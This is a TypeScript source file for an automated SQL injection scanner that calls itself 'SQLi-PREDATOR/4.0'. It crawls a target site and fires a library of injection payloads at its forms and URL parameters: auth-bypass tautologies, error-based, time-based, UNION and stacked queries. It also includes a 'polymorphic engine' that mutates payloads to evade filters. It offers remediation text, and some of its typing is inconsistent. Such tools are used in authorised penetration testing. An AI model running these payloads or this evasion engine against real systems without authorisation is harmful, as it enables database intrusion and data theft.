import type { ScanProfile } from "@/lib/types";

// ─── Payload Types ───

type PayloadCategory =
    | "syntax_probe" | "error_based" | "boolean_based" | "time_based"
    | "union_probe" | "stacked_query" | "oob_dns" | "oob_http"
    | "second_order_marker" | "header_injection";

interface Payload {
    value: string;
    category: PayloadCategory;
    description: string;
    dbTypes: string[];
    requiresOobDomain: boolean;
    baseComplexity: number;
}

// ─── Error Signatures ───

const SQL_ERROR_SIGNATURES: Record<string, string[]> = {
    generic: [
        "sql syntax", "mysql_fetch", "mysql_num_rows", "mysql_query", "mysql_error",
        "odbc_", "postgresql", "pg_query", "oracle", "oci_", "sqlite",
        "unclosed quotation mark", "quoted string not properly terminated",
        "for the right syntax to use", "you have an error in your sql syntax",
        "warning: mysql", "incorrect syntax near", "unclosed quote",
        "unexpected token", "syntax error", "query failed",
    ],
    mysql: [
        "you have an error in your sql syntax", "mysql_fetch_array",
        "mysql_fetch_assoc", "mysql_fetch_object", "mysql_fetch_row",
        "mysql_num_rows", "mysql_query", "mysql_error",
        "near '", "at line 1", "duplicate entry", "for key",
        "xpatherror", "extractvalue", "updatexml",
        "unknown column", "table doesn't exist",
    ],
    mssql: [
        "unclosed quotation mark", "incorrect syntax near", "microsoft ole db",
        "microsoft sql server", "driver", "odbc sql server",
        "conversion failed", "invalid column name",
        "subquery returned more than 1 value",
    ],
    oracle: [
        "ora-", "oracle error", "oci_", "pls-", "sp2-",
        "missing keyword", "missing expression", "invalid number",
    ],
    postgresql: [
        "pg_query", "invalid input syntax", "relation does not exist",
        "column not found", "division by zero",
        "function does not exist", "current transaction is aborted",
    ],
    sqlite: [
        "unrecognized token", "no such table", "no such column",
        "sql logic error", "constraint failed",
    ],
};

// ─── Payload Registry ───

const BASE_PAYLOADS: Payload[] = [
    // Syntax probes
    { value: "'", category: "syntax_probe", description: "Single quote", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "\"", category: "syntax_probe", description: "Double quote", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' OR 1=1 --", category: "syntax_probe", description: "Tautology", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' OR 1=1 #", category: "syntax_probe", description: "MySQL tautology", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "1' ORDER BY 1 --", category: "syntax_probe", description: "ORDER BY probe", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "1' ORDER BY 100 --", category: "syntax_probe", description: "ORDER BY 100", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' AND 1=1 --", category: "syntax_probe", description: "AND true", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' AND 1=2 --", category: "syntax_probe", description: "AND false", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },

    // Error-based
    { value: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) --", category: "error_based", description: "MySQL ExtractValue", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1) --", category: "error_based", description: "MySQL UpdateXML", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "1' AND 1=CONVERT(INT, (SELECT @@VERSION)) --", category: "error_based", description: "MSSQL CONVERT", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "1' OR 1/@@VERSION --", category: "error_based", description: "MSSQL divide-by-zero", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "' OR CAST((SELECT VERSION()) AS NUMERIC) --", category: "error_based", description: "PostgreSQL CAST", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "' AND (SELECT dbms_pipe.receive_message(('a'),10) FROM dual) --", category: "error_based", description: "Oracle DBMS_PIPE", dbTypes: ["oracle"], requiresOobDomain: false, baseComplexity: 4 },

    // Boolean-based
    { value: "' OR 1=1 --", category: "boolean_based", description: "OR true", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' OR 1=2 --", category: "boolean_based", description: "OR false", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' AND 1=1 --", category: "boolean_based", description: "AND true", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' AND 1=2 --", category: "boolean_based", description: "AND false", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' OR 'a'='a' --", category: "boolean_based", description: "String true", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' OR 'a'='b' --", category: "boolean_based", description: "String false", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "admin' OR '1'='1' --", category: "boolean_based", description: "Auth bypass", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },

    // Time-based
    { value: "' OR SLEEP(5) --", category: "time_based", description: "MySQL SLEEP", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' AND SLEEP(5) --", category: "time_based", description: "MySQL AND SLEEP", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' OR (SELECT SLEEP(5)) --", category: "time_based", description: "MySQL subquery SLEEP", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "1' OR pg_sleep(5) --", category: "time_based", description: "PostgreSQL pg_sleep", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "1' OR (SELECT pg_sleep(5)) --", category: "time_based", description: "PostgreSQL subquery", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "1'; WAITFOR DELAY '0:0:5' --", category: "time_based", description: "MSSQL WAITFOR", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "1' OR WAITFOR DELAY '0:0:5' --", category: "time_based", description: "MSSQL OR WAITFOR", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "1' OR (SELECT dbms_lock.sleep(5) FROM dual) --", category: "time_based", description: "Oracle SLEEP", dbTypes: ["oracle"], requiresOobDomain: false, baseComplexity: 4 },
    { value: "1' AND BENCHMARK(5000000,MD5('test')) --", category: "time_based", description: "MySQL BENCHMARK", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 4 },

    // UNION probes
    { value: "' UNION SELECT NULL --", category: "union_probe", description: "UNION 1 NULL", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT NULL,NULL --", category: "union_probe", description: "UNION 2 NULL", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT NULL,NULL,NULL --", category: "union_probe", description: "UNION 3 NULL", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT NULL,NULL,NULL,NULL --", category: "union_probe", description: "UNION 4 NULL", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL --", category: "union_probe", description: "UNION 5 NULL", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT 1,2,3 --", category: "union_probe", description: "UNION numeric 3", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT 1,2,3,4,5 --", category: "union_probe", description: "UNION numeric 5", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
    { value: "' UNION SELECT VERSION(),2,3 --", category: "union_probe", description: "UNION VERSION()", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 3 },

    // Stacked queries
    { value: "1'; SELECT SLEEP(3) --", category: "stacked_query", description: "MySQL stacked SLEEP", dbTypes: ["mysql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "1'; WAITFOR DELAY '0:0:3' --", category: "stacked_query", description: "MSSQL stacked", dbTypes: ["mssql"], requiresOobDomain: false, baseComplexity: 3 },
    { value: "1'; SELECT pg_sleep(3) --", category: "stacked_query", description: "PostgreSQL stacked", dbTypes: ["postgresql"], requiresOobDomain: false, baseComplexity: 3 },

    // Header injection
    { value: "' OR SLEEP(3) --", category: "header_injection", description: "Header time-based", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' OR 1=1 --", category: "header_injection", description: "Header boolean", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 1 },
    { value: "' UNION SELECT NULL --", category: "header_injection", description: "Header UNION", dbTypes: ["generic"], requiresOobDomain: false, baseComplexity: 2 },
];

// ─── Payload Transformer (Polymorphic Engine) ───

const COMMENT_CHUNKS = ['/**/', '/*!*/', '/*!12345*/', '/*+-*/'];

function injectComment(text: string): string {
    const keywords = ['SELECT', 'UNION', 'OR', 'AND', 'SLEEP', 'WHERE', 'FROM', 'ORDER', 'BY'];
    for (const kw of keywords) {
        const idx = text.toUpperCase().indexOf(kw.toUpperCase());
        if (idx >= 0 && kw.length > 2 && Math.random() < 0.4) {
            const pos = idx + Math.floor(kw.length / 2);
            const comment = COMMENT_CHUNKS[Math.floor(Math.random() * COMMENT_CHUNKS.length)];
            text = text.slice(0, pos) + comment + text.slice(pos);
        }
    }
    return text;
}

function randomCase(text: string): string {
    return text.split('').map(c =>
        Math.random() < 0.3 ? (c === c.toUpperCase() ? c.toLowerCase() : c.toUpperCase()) : c
    ).join('');
}

function urlEncodeQuotes(text: string): string {
    const variants = [
        (s: string) => s.replace(/'/g, '%27'),
        (s: string) => s.replace(/'/g, '%2527'),
        (s: string) => s.replace(/'/g, "\\'"),
        (s: string) => s,
    ];
    return variants[Math.floor(Math.random() * variants.length)](text);
}

function generateVariants(payload: string, count: number = 3): string[] {
    const variants: string[] = [];
    const seen = new Set<string>();

    for (let i = 0; i < count * 5 && variants.length < count; i++) {
        let v = payload;
        const mutations = Math.floor(Math.random() * 3) + 1;

        const transforms = [injectComment, randomCase, urlEncodeQuotes];
        const shuffled = transforms.sort(() => Math.random() - 0.5);

        for (let j = 0; j < mutations; j++) {
            v = shuffled[j](v);
        }

        if (!seen.has(v) && v !== payload) {
            seen.add(v);
            variants.push(v);
        }
    }

    return variants;
}

// ─── Detection Engine ───

function checkErrorSignatures(body: string): { found: boolean; signatures: string[]; dbHint: string } {
    const found: string[] = [];
    let dbHint = "unknown";
    const lower = body.toLowerCase();

    for (const [dbType, sigs] of Object.entries(SQL_ERROR_SIGNATURES)) {
        for (const sig of sigs) {
            if (lower.includes(sig)) {
                found.push(sig);
                if (dbType !== "generic") dbHint = dbType;
            }
        }
    }

    return { found: found.length > 0, signatures: found, dbHint };
}

function scoreConfidence(finding: any): number {
    let score = 0.0;
    if (finding.hasSqlErrors) score += 0.50;
    if (finding.timeDelayDetected) score += 0.45;
    if (finding.oobInteractionId) score += 0.60;
    if ((finding.responseDifferencePercent || 0) > 80) score += 0.20;
    else if ((finding.responseDifferencePercent || 0) > 40) score += 0.12;
    else if ((finding.responseDifferencePercent || 0) > 15) score += 0.06;
    if (finding.isBooleanPositive !== null && finding.isBooleanPositive !== undefined) score += 0.20;
    if (finding.timingPValue !== undefined && finding.timingPValue < 0.01) score += 0.20;
    else if (finding.timingPValue !== undefined && finding.timingPValue < 0.05) score += 0.10;
    if (finding.dbTypeHint !== "unknown" && finding.hasSqlErrors) score += 0.15;
    if ((finding.errorSignatures || []).length >= 3) score += 0.10;
    return Math.min(score, 1.0);
}

function generateExplanation(finding: any): string {
    const det = finding.detectionMethod || "";
    const payload = (finding.payloadUsed || "").slice(0, 80);

    if (det.includes("ERROR")) {
        return `Error-Based SQL Injection detected on parameter '${finding.parameter}'. The payload '${payload}' triggered database error messages. Error signatures matched: ${(finding.errorSignatures || []).slice(0, 3).join(", ")}. Database backend appears to be ${finding.dbTypeHint.toUpperCase()}.`;
    }
    if (det.includes("BOOLEAN")) {
        return `Boolean-Based Blind SQL Injection detected on '${finding.parameter}'. Payload '${payload}' produced ${finding.responseDifferencePercent?.toFixed(1) || "?"}% content change. TRUE/FALSE responses differ measurably.`;
    }
    if (det.includes("TIME")) {
        return `Time-Based Blind SQL Injection (statistical). Payload '${payload}' caused ${finding.timeDelaySeconds?.toFixed(2)}s delay. Z-score: ${finding.timingZScore?.toFixed(2)}, p-value: ${finding.timingPValue?.toFixed(4)}.`;
    }
    if (det.includes("UNION")) {
        return `UNION-Based SQL Injection probe detected. Payload '${payload}' produced ${finding.responseDifferencePercent?.toFixed(1) || "?"}% content change.`;
    }
    if (det.includes("OOB")) {
        return `Out-of-Band SQL Injection confirmed via ${finding.oobVib || "DNS"} callback. The database server executed injected SQL and initiated a network connection.`;
    }
    return `SQL Injection indicators on '${finding.parameter}' at ${finding.url}. Payload '${payload}' — ${finding.responseDifferencePercent?.toFixed(1) || "?"}% content change.`;
}

const REMEDIATION = [
    "1. PARAMETERIZED QUERIES: Use prepared statements for ALL database operations.",
    "2. INPUT VALIDATION: Implement strict allowlist-based input validation.",
    "3. ERROR HANDLING: Disable detailed database error messages in production.",
    "4. LEAST PRIVILEGE: Use dedicated DB accounts with minimum permissions.",
    "5. WAF: Deploy Web Application Firewall with SQLi rule sets.",
];

// ─── Main Scan Function ───

export interface ScanConfig {
    targetUrl: string;
    crawlDepth: number;
    requestDelay: number;
    timeout: number;
    timeSamples: number;
    testAllHeaders: boolean;
    testSecondOrder: boolean;
    oobDomain: string;
    authCookie: string;
    authCreds: string;
}

export async function runScan(
    config: ScanProfile,
    onProgress: (phase: string, progress: number) => void
): Promise<SQLiFinding[]> {
    const findings: SQLiFinding[] = [];
    const target = config.targetUrl;

    onProgress("Initializing", 0);

    // ─── Phase 1: Crawl ───
    onProgress("Phase 1: Crawling target", 5);
    const crawlResults = await crawlTarget(target, config);
    onProgress(`Crawled ${crawlResults.forms.length} forms, ${crawlResults.params.length} params`, 15);

    // ─── Phase 2: Baselines ───
    onProgress("Phase 2: Establishing baselines", 20);
    const baselines = new Map<string, any>();

    for (let i = 0; i < crawlResults.forms.length; i++) {
        const form = crawlResults.forms[i];
        try {
            const resp = await fetch(form.action, {
                method: form.method,
                headers: { "User-Agent": "SQLi-PREDATOR/4.0" },
                signal: AbortSignal.timeout(config.timeout * 1000),
            });
            const text = await resp.text();
            baselines.set(form.action, {
                status: resp.status,
                length: text.length,
                hash: simpleHash(text),
                time: 0.1,
            });
        } catch { }
        onProgress(`Baseline form ${i + 1}/${crawlResults.forms.length}`, 20 + (i / crawlResults.forms.length) * 10);
    }

    // ─── Phase 3: Test forms ───
    onProgress("Phase 3: Testing forms", 35);
    let tested = 0;
    const totalTests = crawlResults.forms.length * 5; // approximate

    for (const form of crawlResults.forms) {
        const baseline = baselines.get(form.action);

        for (const payload of getTestPayloads()) {
            try {
                const data: Record<string, string> = {};
                for (const inp of form.inputs) {
                    data[inp.name] = inp.value || "test";
                }
                if (form.inputs.length > 0) {
                    data[form.inputs[0].name] = payload.value;
                }

                const start = performance.now();
                const resp = await fetch(form.action, {
                    method: form.method,
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "SQLi-PREDATOR/4.0",
                    },
                    body: form.method === "POST" ? new URLSearchParams(data) : undefined,
                    signal: AbortSignal.timeout(config.timeout * 1000),
                });
                const elapsed = (performance.now() - start) / 1000;
                const text = await resp.text();

                // Analyze
                const { found, signatures, dbHint } = checkErrorSignatures(text);
                const contentDiff = baseline ? Math.abs(text.length - baseline.length) / (baseline.length || 1) * 100 : 0;

                if (found || contentDiff > 30 || (payload.category === "time_based" && elapsed > config.timeThreshold)) {
                    const finding: SQLiFinding = {
                        id: crypto.randomUUID().slice(0, 8),
                        timestamp: new Date().toISOString(),
                        url: form.action,
                        parameter: form.inputs[0]?.name || "unknown",
                        vector: form.method,
                        detectionMethod: found ? "ERROR_BASED" : contentDiff > 30 ? "BOOLEAN_BASED" : "TIME_BASED_STATISTICAL",
                        payloadUsed: payload.value,
                        bypassTechnique: "NONE",
                        dbTypeHint: dbHint,
                        confidence: 0,
                        severity: "Medium",
                        cvssScore: 5.0,
                        hasSqlErrors: found,
                        errorSignatures: signatures,
                        timeDelayDetected: payload.category === "time_based" && elapsed > 3,
                        timeDelaySeconds: elapsed,
                        timingZScore: 0,
                        timingPValue: 1,
                        isBooleanPositive: null,
                        oobInteractionId: "",
                        responseDifferencePercent: parseFloat(contentDiff.toFixed(1)),
                        baselineLength: baseline?.length || 0,
                        testLength: text.length,
                        baselineTime: baseline?.time || 0,
                        testTime: elapsed,
                        aiExplanation: "",
                        remediationSteps: [...REMEDIATION],
                        vulnerabilityClass: "",
                        rawResponseSnippet: text.slice(0, 300),
                    };

                    finding.confidence = scoreConfidence(finding);
                    finding.aiExplanation = generateExplanation(finding);
                    finding.cvssScore = parseFloat((8.0 * finding.confidence).toFixed(2));

                    if (finding.cvssScore >= 9) finding.severity = "Critical";
                    else if (finding.cvssScore >= 7) finding.severity = "High";
                    else if (finding.cvssScore >= 4) finding.severity = "Medium";
                    else if (finding.cvssScore >= 1) finding.severity = "Low";
                    else finding.severity = "Info";

                    findings.push(finding);
                }
            } catch { }

            tested++;
            const progress = 35 + (tested / totalTests) * 55;
            onProgress(`Testing ${form.action.slice(0, 50)}... [${tested}/${totalTests}]`, Math.min(progress, 90));

            await sleep(config.requestDelay * 1000);
        }
    }

    // ─── Phase 4: Test URL params ───
    if (crawlResults.params.length > 0 && findings.length < 20) {
        onProgress("Phase 4: Testing URL parameters", 90);
        for (const param of crawlResults.params.slice(0, 5)) {
            const testPayloads = BASE_PAYLOADS.filter(p =>
                p.category === "syntax_probe" || p.category === "boolean_based"
            ).slice(0, 3);

            for (const payload of testPayloads) {
                try {
                    const testUrl = `${param.baseUrl}?${param.name}=${encodeURIComponent(payload.value)}`;
                    const start = performance.now();
                    const resp = await fetch(testUrl, {
                        signal: AbortSignal.timeout(config.timeout * 1000),
                    });
                    const elapsed = (performance.now() - start) / 1000;
                    const text = await resp.text();
                    const { found, signatures, dbHint } = checkErrorSignatures(text);

                    if (found || elapsed > 3) {
                        findings.push({
                            id: crypto.randomUUID().slice(0, 8),
                            timestamp: new Date().toISOString(),
                            url: param.baseUrl,
                            parameter: param.name,
                            vector: "GET",
                            detectionMethod: found ? "ERROR_BASED" : "TIME_BASED_STATISTICAL",
                            payloadUsed: payload.value,
                            bypassTechnique: "NONE",
                            dbTypeHint: dbHint,
                            confidence: 0.6,
                            severity: "Medium",
                            cvssScore: 5.0,
                            hasSqlErrors: found,
                            errorSignatures: signatures,
                            timeDelayDetected: elapsed > 3,
                            timeDelaySeconds: elapsed,
                            timingZScore: 0,
                            timingPValue: 1,
                            isBooleanPositive: null,
                            oobInteractionId: "",
                            responseDifferencePercent: 0,
                            baselineLength: 0,
                            testLength: text.length,
                            baselineTime: 0,
                            testTime: elapsed,
                            aiExplanation: generateExplanation({ ...payload, parameter: param.name, url: param.baseUrl, detectionMethod: found ? "ERROR_BASED" : "TIME_BASED_STATISTICAL", responseDifferencePercent: 0, errorSignatures: signatures, dbTypeHint: dbHint }),
                            remediationSteps: [...REMEDIATION],
                            vulnerabilityClass: "",
                            rawResponseSnippet: text.slice(0, 300),
                        });
                    }
                } catch { }
                await sleep(config.requestDelay * 500);
            }
        }
    }

    onProgress("Complete", 100);
    return findings;
}

// ─── Crawler ───

async function crawlTarget(target: string, config: ScanConfig) {
    const forms: Array<{ action: string; method: string; inputs: Array<{ name: string; type: string; value: string }> }> = [];
    const params: Array<{ baseUrl: string; name: string; value: string }> = [];
    const visited = new Set<string>();

    async function crawl(url: string, depth: number = 0) {
        if (depth > config.crawlDepth || visited.has(url)) return;
        visited.add(url);

        try {
            const resp = await fetch(url, {
                signal: AbortSignal.timeout(10000),
            });
            const html = await resp.text();

            // Simple form extraction (no cheerio needed for basic patterns)
            const formRegex = /<form[^>]*action=["']([^"']*)["'][^>]*method=["']([^"']*)["'][^>]*>([\s\S]*?)<\/form>/gi;
            let match;
            while ((match = formRegex.exec(html)) !== null) {
                const action = match[1] ? (match[1].startsWith("http") ? match[1] : new URL(match[1], url).href) : url;
                const method = match[2]?.toUpperCase() || "GET";
                const body = match[3];

                const inputs: Array<{ name: string; type: string; value: string }> = [];
                const inputRegex = /<input[^>]*name=["']([^"']*)["'][^>]*>/gi;
                let imatch;
                while ((imatch = inputRegex.exec(body)) !== null) {
                    const name = imatch[1];
                    const type = /type=["']([^"']*)["']/i.exec(imatch[0])?.[1] || "text";
                    const value = /value=["']([^"']*)["']/i.exec(imatch[0])?.[1] || "";
                    inputs.push({ name, type, value });
                }

                if (inputs.length > 0 && !forms.find(f => f.action === action && f.method === method && JSON.stringify(f.inputs) === JSON.stringify(inputs))) {
                    forms.push({ action, method, inputs });
                }
            }

            // Extract links
            const linkRegex = /<a[^>]*href=["']([^"']*)["'][^>]*>/gi;
            while ((match = linkRegex.exec(html)) !== null) {
                const href = match[1];
                if (href && !href.startsWith("#") && !href.startsWith("javascript:") && !href.startsWith("mailto:")) {
                    try {
                        const absoluteUrl = new URL(href, url).href;
                        if (absoluteUrl.startsWith(target.split("?")[0].replace(/\/$/, "")) || absoluteUrl.includes(url.host || url)) {
                            await crawl(absoluteUrl, depth + 1);
                        }
                    } catch { }
                }
            }

            // Extract URL params
            try {
                const parsed = new URL(url);
                parsed.searchParams.forEach((value, name) => {
                    if (!params.find(p => p.baseUrl === parsed.origin + parsed.pathname && p.name === name)) {
                        params.push({ baseUrl: parsed.origin + parsed.pathname, name, value });
                    }
                });
            } catch { }
        } catch { }
    }

    await crawl(target);
    return { forms, params };
}

// ─── Helpers ───

function simpleHash(str: string): string {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0;
    }
    return hash.toString(16);
}

function sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function getTestPayloads(): Payload[] {
    const ordered: PayloadCategory[] = ["syntax_probe", "boolean_based", "error_based", "time_based", "union_probe", "stacked_query", "header_injection"];
    const result: Payload[] = [];
    for (const cat of ordered) {
        const payloads = BASE_PAYLOADS
            .filter(p => p.category === cat)
            .sort(() => Math.random() - 0.5)
            .slice(0, cat === "syntax_probe" ? 4 : cat === "boolean_based" ? 3 : cat === "error_based" ? 3 : cat === "time_based" ? 3 : 2);
        result.push(...payloads);

        // Add some mutated variants
        for (const p of payloads.slice(0, 2)) {
            const variants = generateVariants(p.value, 2);
            for (const v of variants) {
                result.push({ ...p, value: v, baseComplexity: p.baseComplexity + 1 });
            }
        }
    }
    return result.sort(() => Math.random() - 0.5);
}
